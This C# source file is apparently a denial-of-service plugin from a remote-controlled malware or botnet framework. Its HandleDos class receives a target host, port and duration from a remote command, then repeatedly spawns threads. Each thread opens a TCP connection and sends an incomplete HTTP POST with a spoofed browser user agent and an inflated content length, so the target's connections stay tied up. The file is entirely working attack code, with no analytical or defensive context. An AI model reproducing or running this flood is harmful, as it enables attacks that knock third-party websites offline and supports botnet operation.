using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using MessagePackLib.MessagePack;
using Plugin;

namespace Miscellaneous.Handler
{
    public class HandleDos
    {
        private string host;
        private int port;
        private int timeout;
        private readonly string[] userAgents = { " Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"};

        public void DosPost(MsgPack unpack_msgpack)
        {
            try
            {
                host = new Uri(unpack_msgpack.ForcePathObject("Host").AsString).DnsSafeHost;
                port = Convert.ToInt32(unpack_msgpack.ForcePathObject("port").AsString);
                timeout = Convert.ToInt32(unpack_msgpack.ForcePathObject("timeout").AsString) * 60;
                TimeSpan timespan = TimeSpan.FromSeconds(timeout);
                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();


                Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
                while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && Connection.IsConnected)
                {
                    for (int i = 0; i < 20; i++)
                    {
                        new Thread(() =>
                        {
                            try
                            {
                                Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                tcp.Connect(host.ToString(), port);
                                string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
                                byte[] buffer = Encoding.UTF8.GetBytes(post);
                                tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
                                Thread.Sleep(2500);
                                tcp.Dispose();
                            }
                            catch
                            {
                                //Console.WriteLine("Website may be down!");
                            }
                        }).Start();
                    }
                    Thread.Sleep(5000);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                Packet.ctsDos.Cancel();
            }
        }
    }

}
